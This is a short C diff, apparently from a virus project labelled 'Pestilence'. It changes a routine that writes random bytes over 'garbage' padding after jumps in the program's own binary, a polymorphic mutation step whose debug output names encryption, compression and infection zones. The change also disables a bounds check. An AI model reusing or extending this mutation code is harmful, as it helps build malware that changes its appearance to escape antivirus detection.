@@ -29,11 +29,15 @@ void ft_srand(){
 }
 
 int _replace_jmp_gb(Garbage g){
-	if (&bin_start + g.off + g.len >= &bin_end) return FALSE;
+	debug_ext("(at pos ", g.off, ") ");
+
+	//if (&bin_start + g.off + g.len >= &bin_end) return FALSE;
 
 	unsigned char *p = ((unsigned char *)(&bin_start)) + g.off + 2;
 	int n = g.len - 2;
+	debug_ext(".jmp +", n, ": ");
 	for (int i = 0; i < n; i++){
+		debug_ext(".byte ", p[i], ", ");
 		p[i] = (unsigned char)ft_rand();
 	}
 	return TRUE;
@@ -42,9 +46,20 @@ int _replace_jmp_gb(Garbage g){
 void change_garbage_code(){
 	ft_srand();
 	//print("now: ");printnbln(garbage_table_len);
-	for (size_t i = 0 ; i < garbage_table_len - 1; i++){
+	int x = (size_t)(&cmpr_start) - (size_t)(&bin_start);
+	debug_ext("zone 1:", 0," to ", x-1, " (start, encrypt routine, ...)\n");
+	int x2 = (size_t)(&crypt_start) - (size_t)(&bin_start);
+	debug_ext("zone 2:", x," to ", x2-1, " (compression routine, ...)\n");
+	int x3 = (size_t)(&crypt_end) - (size_t)(&bin_start);
+	debug_ext("zone 3:", x2," to ", x3-1, " (main, infection routine, ...)\n");
+
+	debug_ext("=========== CHECK garbage codes ===========\n", 0, ": ");
+	for (size_t i = 0 ; i < garbage_table_len-2; i++){
 		_replace_jmp_gb(garbage_table[i]);
+		if (i+1 != garbage_table_len-2)
+		debug_ext("\n", i+1, ": ");
 	}
+	debug_ext("\n=========== END CHECK garbage codes =======\nGot:", garbage_table_len, "\n");
 }
 
 //======================= PESTILENCE =========================
